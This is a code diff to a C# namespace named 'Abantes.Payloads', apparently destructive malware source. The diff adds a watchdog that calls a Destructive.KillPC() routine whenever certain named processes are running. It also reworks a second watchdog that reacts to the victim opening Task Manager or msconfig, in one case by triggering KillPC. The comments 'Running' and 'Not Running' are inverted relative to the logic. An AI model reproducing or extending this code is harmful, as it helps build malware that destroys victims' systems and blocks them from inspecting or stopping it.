@@ -250,6 +250,24 @@ namespace Abantes.Payloads
     }
     class WatchDog
     {
+        public static void ProcessRunningWatchDog(string[] sProcessNames)
+        {
+            //Put each process to watch for in an array to check if it exists
+
+            for (int i = 0; i < sProcessNames.Count(); i++)
+            {
+                Process[] proc = Process.GetProcessesByName(sProcessNames[i]);
+                if (proc.Length == 0)
+                {
+                    //Running
+                }
+                else
+                {
+                    //Not Running
+                    Destructive.KillPC();
+                }
+            }
+        }
         public static void FileWatchDog(string[] sFileName)
         {
             //Put each files path in an array to check if it exists
@@ -262,19 +280,20 @@ namespace Abantes.Payloads
                 }
             }
         }
-        public static void ApplicationWatchDog(string[] sProcessName)
+        public static void ProcessNotRunningWatchDog(string[] sProcessNames)
         {
             //Put each process to watch for in an array to check if it exists
             
-            for (int i = 0; i < sProcessName.Count(); i++)
+            for (int i = 0; i < sProcessNames.Count(); i++)
             {
                 
-                Process[] proc = Process.GetProcessesByName(sProcessName[i]);
+                Process[] proc = Process.GetProcessesByName(sProcessNames[i]);
                 if (proc.Length > 0)
                 {
                     
                     if (proc[0].ToString() == Process.GetProcessesByName("taskmgr")[0].ToString())
                     {
+                        //Flagged
                         SpeechSynthesizer TTS = new SpeechSynthesizer();
                         TTS.SetOutputToDefaultAudioDevice();
                         TTS.Volume = 100;
@@ -282,6 +301,7 @@ namespace Abantes.Payloads
                     }
                     else if (proc[0].ToString() == Process.GetProcessesByName("msconfig")[0].ToString())
                     {
+                        //Flagged
                         Destructive.KillPC();
                     }
                     else
